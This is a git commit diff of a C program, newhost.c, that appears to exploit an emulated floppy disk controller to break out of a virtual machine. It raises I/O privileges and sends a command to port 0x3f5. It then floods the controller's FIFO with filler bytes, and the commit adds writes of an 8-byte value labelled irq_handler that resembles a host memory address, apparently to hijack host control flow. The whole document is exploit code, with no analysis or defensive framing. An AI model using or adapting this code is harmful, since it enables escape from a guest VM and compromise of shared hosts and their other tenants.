663685200ebc94cf9dde4319f5fb1014c281dfdd
Yihao <yzhng127@illinois.edu>
2015-11-03 13:57:13 -0600

    a

--- newhost.c
+++ newhost.c
@@ -3,7 +3,7 @@
 #define FIFO 0x3f5
 #define RDID 0x0a
 #define SPC_COMMAND 0x8e
-#define BH_COUNT 0x2000
+#define BH_COUNT 0x16c0
 #define SH_POSITION 0x1ff
 #define SH_COUNT 7
 #define TEST_VAL  0x11
@@ -12,17 +12,19 @@
 #define NUM_STRUCT 0x00
 #define STRUCT_LEN 0x28
 int main(void){
-        unsigned char code[] = {'m','k','t','e','m','p','\0'};  //this can be a input of the function
-        int len_of_command = sizeof(code)/(sizeof(char));
-  
+
+		char irq_handler[8] =    {0x30,0xd2,0xd2,0xf3,0xff,0x7f,0x00,0x00};
         //open up port and set permission
         iopl(3);
         ioperm(FIFO, 1, 1);
         outb(SPC_COMMAND, FIFO);
-
+       
         int i;
         for(i=0; i<BH_COUNT; i++){
             outb(TEST_VAL, FIFO);
+        }
+        for(i=0; i< 8; i++){
+            outb(irq_handler[i], FIFO);
         }
         
 }
